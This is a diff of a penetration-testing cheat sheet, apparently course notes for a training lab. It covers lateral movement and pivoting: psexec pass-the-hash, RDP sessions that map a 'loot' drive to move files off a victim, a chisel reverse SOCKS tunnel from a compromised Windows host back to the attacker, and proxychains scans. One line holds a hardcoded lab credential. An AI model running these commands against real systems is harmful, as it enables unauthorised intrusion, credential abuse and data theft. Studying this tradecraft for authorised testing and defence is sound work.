@@ -41,16 +41,24 @@ impacket-psexec <DOMAIN>/<user>@<ip> -hashes :<NTLM>
 impacket-psexec <DOMAIN>/<user>:'<pass>'@<ip>
 ```
 
-#### xfreerdp (with clipboard + drive sharing)
+#### xfreerdp (with clipboard + drive sharing — easiest Windows file transfer)
 
 ```bash
-mkdir -p /root/rdp-share
-xfreerdp /v:<ip> /u:<user> /p:'<pass>' /d:<DOMAIN> \
-    /cert:ignore /dynamic-resolution +clipboard \
-    /drive:share,/root/rdp-share
+## Quick — clipboard only
+xfreerdp /u:'Bob' /p:'HTB_@cademy_stdnt!' /v:10.129.202.99 +clipboard
+
+## With a shared loot drive (drag-and-drop both ways)
+mkdir -p /home/kali/loot
+xfreerdp3 /v:172.16.119.10 /u:'NEXURA\stom' /p:'<pass>' \
+    /cert:ignore +clipboard /drive:loot,/home/kali/loot
 ```
 
-Files drop into `\\tsclient\share` on the Windows side — drag-and-drop between Kali and the target.
+- On the Windows victim, your share is `\\tsclient\loot`
+- On Kali, files land in `/home/kali/loot`
+
+#### RDP Pass-the-Hash (`/pth:`)
+
+Requires Restricted Admin enabled on the target — see [AD Initial Access → RDP PtH](../3-exploitation/05-ad-initial-access.md).
 
 #### RDP enumeration / security check
 
@@ -63,15 +71,38 @@ nmap -p 3389 --script rdp-enum-encryption <ip>
 
 #### chisel (TCP over HTTP — most reliable through proxies)
 
+Use when you need a direct connection from Kali to a host you can't reach (file transfers too painful, weird egress, etc.).
+
 ```bash
+## On Kali — install
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+
 ## On Kali (server)
-./chisel server --reverse -p 8000
+sudo ./chisel server --reverse -p 8080
 
 ## On compromised Windows host (client)
-.\chisel.exe client <kali>:8000 R:1080:socks
+c:\tools\chisel.exe client <kali>:8080 R:socks
 ```
 
-Now `127.0.0.1:1080` on Kali is a SOCKS proxy into the victim's network.
+Configure proxychains on Kali:
+
+```bash
+cat /etc/proxychains.conf
+...
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+Then use it:
+
+```bash
+proxychains impacket-wmiexec dc01 -k
+proxychains nmap -sT -Pn -sCV <ip>           # MUST be TCP-only over SOCKS
+```
+
+> nmap over proxychains must be `-sT` (full TCP connect) — SYN scans don't survive a SOCKS hop. Stick to ports you care about; it's slow.
 
 #### SSH tunneling (if SSH available)
 
